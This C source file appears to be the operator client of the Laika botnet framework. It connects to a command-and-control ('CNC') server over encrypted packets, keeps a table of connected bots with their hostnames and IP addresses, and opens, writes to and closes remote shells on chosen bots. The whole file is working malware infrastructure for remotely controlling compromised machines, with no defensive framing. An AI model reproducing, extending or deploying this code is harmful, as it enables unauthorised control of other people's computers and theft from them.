#include "lmem.h"
#include "lerror.h"
#include "lpacket.h"
#include "lsodium.h"
#include "sterm.h"

#include "sclient.h"

/* ==============================================[[ PeerHashMap ]]=============================================== */

typedef struct sShell_hashMapElem {
    int id;
    tShell_peer *peer;
    uint8_t *pub;
} tShell_hashMapElem;

int shell_ElemCompare(const void *a, const void *b, void *udata) {
    const tShell_hashMapElem *ua = a;
    const tShell_hashMapElem *ub = b;

    return memcmp(ua->pub, ub->pub, crypto_kx_PUBLICKEYBYTES); 
}

uint64_t shell_ElemHash(const void *item, uint64_t seed0, uint64_t seed1) {
    const tShell_hashMapElem *u = item;
    return *(uint64_t*)(u->pub); /* hashes pub key (first 8 bytes) */
}

/* ============================================[[ Packet Handlers ]]============================================= */

void shellC_handleHandshakeRes(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t endianness = laikaS_readByte(&peer->sock);
    peer->sock.flipEndian = endianness != laikaS_isBigEndian();

    PRINTSUCC("Handshake accepted!\n");
}

void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    char hostname[LAIKA_HOSTNAME_LEN], inet[LAIKA_INET_LEN], ipv4[LAIKA_IPV4_LEN];
    uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
    tShell_client *client = (tShell_client*)uData;
    tShell_peer *bot;
    uint8_t type, osType;

    /* read newly connected peer's pubKey */
    laikaS_read(&peer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);

    /* read hostname & ipv4 */
    laikaS_read(&peer->sock, hostname, LAIKA_HOSTNAME_LEN);
    laikaS_read(&peer->sock, inet, LAIKA_INET_LEN);
    laikaS_read(&peer->sock, ipv4, LAIKA_IPV4_LEN);

    /* read peer's peerType & osType */
    type = laikaS_readByte(&peer->sock);
    osType = laikaS_readByte(&peer->sock);

    /* ignore panel clients */
    if (type == PEER_AUTH)
        return;

    /* create peer */
    bot = shellP_newPeer(type, osType, pubKey, hostname, inet, ipv4);

    /* add peer to client */
    shellC_addPeer(client, bot);
}

void shellC_handleRmvPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
    tShell_client *client = (tShell_client*)uData;
    tShell_peer *bot;
    uint8_t type;
    int id;

    /* read public key & type */
    laikaS_read(&peer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);
    type = laikaS_readByte(&peer->sock);

    /* ignore panel clients */
    if (type == PEER_AUTH)
        return;

    if ((bot = shellC_getPeerByPub(client, pubKey, &id)) == NULL)
        LAIKA_ERROR("LAIKAPKT_AUTHENTICATED_RMV_PEER_RES: Unknown peer!\n");

    /* remove peer */
    shellC_rmvPeer(client, bot, id);
}

void shellC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t buf[LAIKA_SHELL_DATA_MAX_LENGTH];
    tShell_client *client = (tShell_client*)uData;

    /* sanity check */
    if (!shellC_isShellOpen(client))
        LAIKA_ERROR("LAIKAPKT_SHELL_DATA: No shell open!\n");

    laikaS_read(&peer->sock, buf, sz);
    shellT_writeRawOutput(buf, sz);
}

void shellC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
    tShell_client *client = (tShell_client*)uData;
    
    /* sanity check */
    if (!shellC_isShellOpen(client))
        LAIKA_ERROR("LAIKAPKT_SHELL_DATA: No shell open!\n");

    /* close shell */
    shellC_closeShell(client);
}

/* ==============================================[[ Packet Table ]]============================================== */

struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_RES,
        shellC_handleHandshakeRes,
        sizeof(uint8_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_ADD_PEER_RES,
        shellC_handleAddPeer,
        crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_INET_LEN + LAIKA_IPV4_LEN + sizeof(uint8_t) + sizeof(uint8_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_RMV_PEER_RES,
        shellC_handleRmvPeer,
        crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t),
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_CLOSE,
        shellC_handleShellClose,
        0,
    false),
    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
        shellC_handleShellData,
        0,
    true)
};

/* socket event */
void shellC_onPollFail(struct sLaika_socket *sock, void *uData) {
    struct sLaika_peer *peer = (struct sLaika_peer*)sock;
    struct sShell_client *client = (struct sShell_client*)uData;

    laikaS_kill(&client->peer->sock);
}

/* ===============================================[[ Client API ]]=============================================== */

void shellC_init(tShell_client *client) {
    laikaP_initPList(&client->pList);
    client->peer = laikaS_newPeer(
        shellC_pktTbl,
        &client->pList,
        shellC_onPollFail,
        (void*)client,
        (void*)client
    );

    client->peers = hashmap_new(sizeof(tShell_hashMapElem), 8, 0, 0, shell_ElemHash, shell_ElemCompare, NULL, NULL);
    client->openShell = NULL;
    client->peerTbl = NULL;
    client->peerTblCap = 4;
    client->peerTblCount = 0;

    /* load authenticated keypair */
    if (sodium_init() < 0) {
        shellC_cleanup(client);
        LAIKA_ERROR("LibSodium failed to initialize!\n");
    }

    if (!laikaK_loadKeys(client->pub, client->priv, LAIKA_PUBKEY, LAIKA_PRIVKEY)) {
        shellC_cleanup(client);
        LAIKA_ERROR("Failed to init keypair!\n");
    }

    /* read cnc's public key into peerPub */
    if (!laikaK_loadKeys(client->peer->peerPub, NULL, LAIKA_PUBKEY, NULL)) {
        shellC_cleanup(client);
        LAIKA_ERROR("Failed to init cnc public key!\n");
    }
}

void shellC_cleanup(tShell_client *client) {
    int i;

    laikaS_freePeer(client->peer);
    laikaP_cleanPList(&client->pList);
    hashmap_free(client->peers);

    /* free peers */
    for (i = 0; i < client->peerTblCount; i++) {
        if (client->peerTbl[i])
            shellP_freePeer(client->peerTbl[i]);
    }
    laikaM_free(client->peerTbl);
}

void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
    struct sLaika_socket *sock = &client->peer->sock;

    PRINTINFO("Connecting to CNC...\n");

    /* create encryption keys */
    if (crypto_kx_client_session_keys(client->peer->inKey, client->peer->outKey, client->pub, client->priv, client->peer->peerPub) != 0)
        LAIKA_ERROR("failed to gen session key!\n");

    /* setup socket */
    laikaS_connect(sock, ip, port);
    laikaS_setNonBlock(sock);
    laikaP_addSock(&client->pList, sock);

    /* queue handshake request */
    laikaS_startOutPacket(client->peer, LAIKAPKT_HANDSHAKE_REQ);
    laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
    laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
    laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
    laikaS_writeByte(sock, LAIKA_OSTYPE);
    laikaS_write(sock, client->pub, sizeof(client->pub)); /* write public key */

    /* write stub hostname & ipv4 (since we're a panel/dummy client, cnc doesn't need this information really) */
    laikaS_zeroWrite(sock, LAIKA_HOSTNAME_LEN);
    laikaS_zeroWrite(sock, LAIKA_IPV4_LEN);
    laikaS_endOutPacket(client->peer);
    laikaS_setSecure(client->peer, true); /* after our handshake, all packet bodies are encrypted */

    /* queue authenticated handshake request */
    laikaS_startOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ);
    laikaS_writeByte(sock, PEER_AUTH);
    laikaS_endOutPacket(client->peer);

    /* the handshake requests will be sent on the next call to shellC_poll */
}

bool shellC_poll(tShell_client *client, int timeout) {
    struct sLaika_pollEvent *evnts, *evnt;
    int numEvents, i;

    /* flush any events prior (eg. made by a command handler) */
    laikaP_flushOutQueue(&client->pList);
    evnts = laikaP_poll(&client->pList, timeout, &numEvents);

    if (numEvents == 0) /* no events? timeout was reached */
        return false;

    for (i = 0; i < numEvents; i++) {
        evnt = &evnts[i];
        laikaP_handleEvent(evnt);
    }

    /* flush any events after (eg. made by a packet handler) */
    laikaP_flushOutQueue(&client->pList);
    return true;
}

tShell_peer *shellC_getPeerByPub(tShell_client *client, uint8_t *pub, int *id) {
    tShell_hashMapElem *elem = (tShell_hashMapElem*)hashmap_get(client->peers, &(tShell_hashMapElem){.pub = pub});

    /* return peer if elem was found, otherwise return NULL */
    if (elem) {
        *id = elem->id;
        return elem->peer;
    } else {
        *id = -1;
        return NULL;
    }
}

int shellC_addPeer(tShell_client *client, tShell_peer *newPeer) {
    /* find empty ID */
    int id;
    for (id = 0; id < client->peerTblCount; id++) {
        if (client->peerTbl[id] == NULL) /* it's empty! */
            break;
    }

    /* if we didn't find an empty id, grow the array */
    if (id == client->peerTblCount) {
        laikaM_growarray(tShell_peer*, client->peerTbl, 1, client->peerTblCount, client->peerTblCap);
        client->peerTblCount++;
    }

    /* add to peer lookup table */
    client->peerTbl[id] = newPeer;

    /* insert into hashmap */
    hashmap_set(client->peers, &(tShell_hashMapElem){.id = id, .pub = newPeer->pub, .peer = newPeer});

    /* let user know */
    if (!shellC_isShellOpen(client)) {
        PRINTSUCC("Peer %04d connected\n", id)
    }

    return id;
}

void shellC_rmvPeer(tShell_client *client, tShell_peer *oldPeer, int id) {
    /* remove from bot tbl */
    client->peerTbl[id] = NULL;

    /* remove peer from hashmap */
    hashmap_delete(client->peers, &(tShell_hashMapElem){.pub = oldPeer->pub, .peer = oldPeer});

    /* tell user */
    if (!shellC_isShellOpen(client)) {
        PRINTINFO("Peer %04d disconnected\n", id)
    }

    /* finally, free peer */
    shellP_freePeer(oldPeer);
}

void shellC_openShell(tShell_client *client, tShell_peer *peer, uint16_t col, uint16_t row) {
    /* check if we already have a shell open */
    if (client->openShell)
        return;

    /* send SHELL_OPEN request */
    laikaS_startOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ);
    laikaS_write(&client->peer->sock, peer->pub, sizeof(peer->pub));
    laikaS_writeInt(&client->peer->sock, &col, sizeof(uint16_t));
    laikaS_writeInt(&client->peer->sock, &row, sizeof(uint16_t));
    laikaS_endOutPacket(client->peer);
    client->openShell = peer;
}

void shellC_closeShell(tShell_client *client) {
    /* check if we have a shell open */
    if (!shellC_isShellOpen(client))
        return;

    /* send SHELL_CLOSE request */
    laikaS_emptyOutPacket(client->peer, LAIKAPKT_SHELL_CLOSE);
    client->openShell = NULL;
}

void shellC_sendDataShell(tShell_client *client, uint8_t *data, size_t sz) {
    /* check if we have a shell open */
    if (!shellC_isShellOpen(client))
        return;

    laikaS_startVarPacket(client->peer, LAIKAPKT_SHELL_DATA);
    laikaS_write(&client->peer->sock, data, sz);
    laikaS_endVarPacket(client->peer);
}
